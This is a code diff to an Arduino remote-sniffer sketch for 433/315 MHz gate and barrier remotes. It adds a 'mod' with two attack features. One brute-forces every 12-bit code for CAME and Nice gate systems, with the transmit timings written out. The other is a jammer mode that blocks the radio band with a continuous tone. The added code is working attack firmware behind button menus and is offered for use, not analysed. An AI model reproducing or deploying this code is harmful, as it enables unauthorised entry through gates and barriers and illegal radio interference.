@@ -1,10 +1,22 @@
 /*
+  Мод на перебор кодов и глушилку
   Скетч к проекту "Универсальный пульт для шлагаумов и люср RF 433.96MHz / 315MHz с OLED дисплеем и хранением 30 ключей в памяти EEPROM"
   Аппаратная часть построена на Arduino Pro Mini 3.3v
+  Аппаратная часть мода (на других схемах не тестил) построена на Arduino pro Mini 5v 16mhz
   Исходники на GitHub: https://github.com/AlexMalov/RadioSniffer/
+  Исходники мода на GitHub:https://github.com/GlUTEN-BASH/RadioSniffer/
   Автор: МЕХАТРОН DIY, AlexMalov, 2020
+  Aвтор мода: Sudo Killa, Gluten, Глютюшушка, 2020
+  Mod ver 1.0
   v 1.1
+  alexdsl - добавил мануальный режим(M), без засыпания, для возможности ручного сохранения нужного кода.
 */
+
+unsigned int came_sost = 0;
+unsigned int nice_sost = 0;
+unsigned int bd = 0;
+unsigned int s = 0;
+int var=0,i,ii=0,x,y;
 
 #include <EEPROM.h>
 #include <avr/sleep.h>
@@ -12,6 +24,8 @@
 #include <OLED_I2C.h>
 #include "pitches.h"
 #include "GyverButton.h"
+
+
 
 //settings
 #define prescal clock_div_4                     // делитель такотовой частоты
@@ -22,13 +36,13 @@
 //pins
 #define rxPin 2         // выход приемника int0
 #define RVR_Vcc_Pin 4   // включение питания приемника
-#define txPin 9         // вход передатчика
-#define TM_Vcc_Pin 8    // питание передачика
-#define TM_gnd_Pin 7    // земля передатчика
-#define speakerPin 10   // Спикер, он же buzzer, он же beeper
+#define txPin 9        // вход передатчика
+#define TM_Vcc_Pin 8   // питание передачика
+#define TM_gnd_Pin 7   // земля передатчика
+#define speakerPin 10  // Спикер, он же buzzer, он же beeper
 #define spr_gnd_Pin 11  // Земля спикера
 #define G_Led 13        // всроенный свеодиод
-#define Btn_ok_Pin 3    // Кнопка оправки текущего кода
+#define Btn_ok_Pin 3  // Кнопка оправки текущего кода
 #define Btn_left_Pin 5  // Кнопка влево
 #define Btn_right_Pin 6 // Кнопка вправо
 
@@ -45,7 +59,7 @@ volatile byte logLen;                 // фактическая длинна л�
 volatile bool SleepOn = false;        // режим энергосережения
 
 enum emKeys {kUnknown, kP12bt, k12bt, k24bt, k64bt, kKeeLoq, kANmotors64};    // тип оригинального ключа
-enum emSnifferMode {smdNormal, smdAutoRec, smdAutoRecSilence} snifferMode;          // режим раоы сниффера
+enum emSnifferMode {smdNormal, smdManual, smdAutoRec, smdAutoRecSilence} snifferMode;          // режим раоы сниффера
 
 struct tpKeyRawData{  
   byte keyID[9];            // шифр ключа 12-66 bit
@@ -83,7 +97,8 @@ unsigned long stTimer = 0;                // тамер сна
 void OLED_printKey(tpKeyData* kd, byte msgType = 0){
   String st;
   switch (snifferMode){
-    case smdNormal: myOLED.clrScr(); myOLED.print("N", RIGHT, 24); break; 
+    case smdNormal: myOLED.clrScr(); myOLED.print("N", RIGHT, 24); break;
+    case smdManual: myOLED.clrScr(); myOLED.print("M", RIGHT, 24); break;  
     case smdAutoRec: myOLED.clrScr(); myOLED.print("A", RIGHT, 24); break; 
     case smdAutoRecSilence: return; 
   }
@@ -103,7 +118,8 @@ void OLED_printKey(tpKeyData* kd, byte msgType = 0){
 
 void OLED_printError(String st, bool err = true){
   switch (snifferMode){
-    case smdNormal: myOLED.clrScr(); myOLED.print("N", RIGHT, 24); break; 
+    case smdNormal: myOLED.clrScr(); myOLED.print("N", RIGHT, 24); break;
+    case smdManual: myOLED.clrScr(); myOLED.print("M", RIGHT, 24); break;  
     case smdAutoRec: myOLED.clrScr(); myOLED.print("A", RIGHT, 24); break; 
     case smdAutoRecSilence: return; 
   }
@@ -111,6 +127,19 @@ void OLED_printError(String st, bool err = true){
     else myOLED.print(F("OK"), 0, 0);
   myOLED.print(st, 0, 12);  
   myOLED.update();
+}
+
+void Sd_StartOK(){   // звук "Успешное включение"
+  if (snifferMode == smdAutoRecSilence) return;
+  tone(speakerPin, NOTE_A7); delay(80 >> prescal);
+  tone(speakerPin, NOTE_G7); delay(80 >> prescal);
+  tone(speakerPin, NOTE_E7); delay(80 >> prescal); 
+  tone(speakerPin, NOTE_C7); delay(80 >> prescal);  
+  tone(speakerPin, NOTE_B7); delay(80 >> prescal);
+  tone(speakerPin, NOTE_D7); delay(80 >> prescal); 
+  tone(speakerPin, NOTE_C7); delay(80 >> prescal);
+  tone(speakerPin, NOTE_F7); delay(80 >> prescal); 
+  noTone(speakerPin); 
 }
 
 byte indxKeyInROM(tpKeyData* kd){ //возвращает индекс или ноль если нет в ROM
@@ -183,8 +212,8 @@ void setup() {
   myOLED.clrScr();                                          //Очищаем буфер дисплея.
   myOLED.setFont(SmallFont);                                //Перед выводом текста необходимо выбрать шрифт
   myOLED.print(F("Hello, read a key..."), LEFT, 0);
-  const char st[16] = {98, 121, 32, 77, 69, 88, 65, 84, 80, 79, 72, 32, 68, 73, 89, 0};
-  myOLED.print(st, LEFT, 24);
+ //const char st[16] = {98, 121, 32, 77, 69, 88, 65, 84, 80, 79, 72, 32, 68, 73, 89, 0};
+ // myOLED.print(st, LEFT, 24);
   myOLED.update();
   snifferMode = smdNormal;
   Sd_StartOK();
@@ -221,6 +250,7 @@ String getTypeName(emKeys tp){
     case kP12bt: return F(" Pre 12bit");
     case k12bt: return F(" 12bit");
     case k24bt: return F(" 24bit");
+    case k64bt: return F(" 64bit");
     case kKeeLoq: return F(" KeeLoq");
     case kANmotors64: return F(" ANmotors");
   }
@@ -462,9 +492,181 @@ void go2sleep(){
   digitalWrite(RVR_Vcc_Pin, HIGH);  //включаем приемник
   Serial.print(F("wakeUP!"));
 }
+void SendBit(byte b){
+if (came_sost == 1) {
+x = 640;
+y = 320;
+} else {
+x = 1400;
+y = 700;
+}
+if (b) {
+digitalWrite(txPin, LOW); // 1
+delayMicroseconds(x);
+digitalWrite(txPin, HIGH);
+delayMicroseconds(y);
+}
+ else {
+ digitalWrite(txPin, LOW); // 0
+ delayMicroseconds(y);
+ digitalWrite(txPin, HIGH);
+ delayMicroseconds(x);
+}
 
+}
+
+ void Send_preambula(int preambula){
+ digitalWrite(txPin, HIGH);
+ delayMicroseconds(preambula);
+ digitalWrite(txPin, LOW);
+}
+
+ void nicebrute(){
+ while(1){
+SendPerebor(var, 700, 25200);
+ var=var+1;
+if (var%204 == 0){
+ ii = ii + 5;
+Serial.println(ii);
+ Serial.println(ii);
+}
+if (var > 4096){
+var=0;
+break;
+}
+}
+}
+
+void camebrute()
+{
+ while(1)
+ {
+ SendPerebor(var, 320, 11520);
+ var=var+1;
+ if (var%204 == 0)
+ { //не удалять
+ ii = ii + 5;
+ Serial.println(ii);
+ Serial.println(ii);
+ }
+ if (var > 4096)
+ {
+ var=0;
+ break;
+ }
+}
+}
+
+ void SendPerebor(long Code,unsigned int preambula,unsigned int pilot){
+ for (int i=0; i<4; i++){ // посылку посылаем 4 раза подряд.
+ Send_preambula(preambula); // время стартового импульса
+ for (int i=12; i>0; i--){
+ SendBit(bitRead(Code,i-1)); // побитово перебираем и посылаем код
+}
+ digitalWrite(txPin, LOW);
+ delayMicroseconds(pilot);
+}
+}
+
+
+void glush(){
+s = 0;
+myOLED.clrScr();
+myOLED.print(F("Jammer?"), 1, 0);
+myOLED.print(F("On"), 10, 20);
+myOLED.print(F("Off"), 10, 10);
+myOLED.update();
+delay(350);
+while (s = "0"){
+  if (btn_left.isHold()){
+    digitalWrite(RVR_Vcc_Pin, LOW);
+ myOLED.clrScr();
+  myOLED.print(F("Jammer on"), 1, 0);
+   myOLED.update();
+ digitalWrite(TM_Vcc_Pin, HIGH);
+ tone(txPin, 15000);
+ s = 1;
+  }
+ if (btn_right.isHold()){
+   digitalWrite(RVR_Vcc_Pin, HIGH);
+  myOLED.clrScr();
+  myOLED.print(F("Jammer  off"), 1, 0);
+   myOLED.update();
+ digitalWrite(TM_Vcc_Pin, LOW);
+ noTone(txPin);
+ s = 1;
+
+  }
+}
+
+}
+
+void brute(){
+bd = 0;
+myOLED.print(F("Choose a system:"), 1, 0);
+myOLED.print(F("Came"), 10, 20);
+myOLED.print(F("Nice"), 10, 10);
+myOLED.update();
+delay(350);
+while(bd = "0"){
+if (btn_left.isHold()){
+  digitalWrite(TM_Vcc_Pin, HIGH);
+  digitalWrite(RVR_Vcc_Pin, LOW);
+    myOLED.clrScr();
+    myOLED.print(F("Bruteforcing Came"), 1, 0);
+    Serial.println(F("Bruting Came"));
+    myOLED.update();
+    camebrute();
+    delay(3000);
+    myOLED.update();
+    digitalWrite(TM_Vcc_Pin, LOW);
+    digitalWrite(RVR_Vcc_Pin, HIGH);
+    stTimer = millis();
+    bd = 1;
+}
+if (btn_right.isHold()){
+  digitalWrite(TM_Vcc_Pin, HIGH);
+    myOLED.clrScr();
+    digitalWrite(RVR_Vcc_Pin, LOW);
+    myOLED.print(F("Bruteforcing Nice"), 1, 0);
+    Serial.println(F("Bruting Nice"));
+    myOLED.update();
+    nicebrute();
+    delay(3000);
+    myOLED.update();
+    digitalWrite(TM_Vcc_Pin, LOW);
+    digitalWrite(RVR_Vcc_Pin, HIGH);
+    stTimer = millis();
+    bd = 1;
+}
+}
+}
+  
 void loop() {
-  btn_ok.tick(); btn_left.tick(); btn_right.tick();
+    btn_ok.tick(); btn_left.tick(); btn_right.tick();
+   if (btn_left.isHold() && btn_ok.isHold()){
+    myOLED.clrScr();
+    myOLED.print(F("JAMMER MODE"), 1, 0);
+    myOLED.update();
+    Serial.println(F("Jamming..."));
+     delay(200);
+    glush();
+    myOLED.update();
+    stTimer = millis();
+  }
+  
+   if (btn_right.isHold() && btn_ok.isHold()){
+    myOLED.clrScr();
+    myOLED.print(F("BRUTEMODE"), 1, 0);
+    myOLED.update();
+    Serial.println(F("In brutemode menu"));
+    delay(200);
+    brute();
+    myOLED.update();
+    stTimer = millis();
+  }
+
+
   char echo = Serial.read(); if (echo > 0) Serial.println(echo);
   if ((echo == 'e') || (btn_left.isHold() && btn_right.isHold())){
     myOLED.print(F("EEPROM cleared success!"), 0, 0);
@@ -502,7 +704,8 @@ void loop() {
   }
   if (dcl) {
     switch (snifferMode){
-      case smdNormal: snifferMode = smdAutoRec; OLED_printKey(&keyData1); Sd_ReadOKK(); Sd_ReadOK(); break; 
+      case smdNormal: snifferMode = smdManual; OLED_printKey(&keyData1); Sd_ReadOKK(); Sd_ReadOK(); break; 
+      case smdManual: snifferMode = smdAutoRec; OLED_printKey(&keyData1); Sd_ReadOKK(); Sd_ReadOK(); break; 
       case smdAutoRec: Sd_ReadOKK(); Sd_ReadOK(); snifferMode = smdAutoRecSilence; myOLED.sleepMode(SLEEP_ON); break; 
       case smdAutoRecSilence: snifferMode = smdNormal; myOLED.sleepMode(SLEEP_OFF); OLED_printKey(&keyData1); Sd_ReadOKK(); Sd_ReadOK(); break; 
     }
@@ -531,13 +734,18 @@ void loop() {
       }
     } else Sd_ErrorBeep();
     if (snifferMode != smdAutoRecSilence) printDebugData();
-    if ((snifferMode != smdNormal) && (keyData1.codeLenth != 0)){
-      if (EPPROM_AddKey(&keyData1)) {
-        OLED_printError(F("The key saved"), false);
-        Sd_ReadOKK();
-        delay(500 >> prescal); 
-      } else Sd_ErrorBeep();
-      OLED_printKey(&keyData1);
+    if ((snifferMode != smdNormal) && (keyData1.codeLenth != 0))
+    {
+      if (snifferMode != smdManual)
+      {
+        if (EPPROM_AddKey(&keyData1))
+          {
+            OLED_printError(F("The key saved"), false);
+            Sd_ReadOKK();
+            delay(500 >> prescal); 
+          } else Sd_ErrorBeep();
+        OLED_printKey(&keyData1);
+      }
     }
     stTimer = millis();
     recieved = false;
@@ -583,17 +791,4 @@ void Sd_ErrorBeep() {  // звук "ERROR"
     delay(40 >> prescal);
   }
   noTone(speakerPin);
-}
-
-void Sd_StartOK(){   // звук "Успешное включение"
-  if (snifferMode == smdAutoRecSilence) return;
-  tone(speakerPin, NOTE_A7); delay(80 >> prescal);
-  tone(speakerPin, NOTE_G7); delay(80 >> prescal);
-  tone(speakerPin, NOTE_E7); delay(80 >> prescal); 
-  tone(speakerPin, NOTE_C7); delay(80 >> prescal);  
-  tone(speakerPin, NOTE_B7); delay(80 >> prescal);
-  tone(speakerPin, NOTE_D7); delay(80 >> prescal); 
-  tone(speakerPin, NOTE_C7); delay(80 >> prescal);
-  tone(speakerPin, NOTE_F7); delay(80 >> prescal); 
-  noTone(speakerPin); 
 }
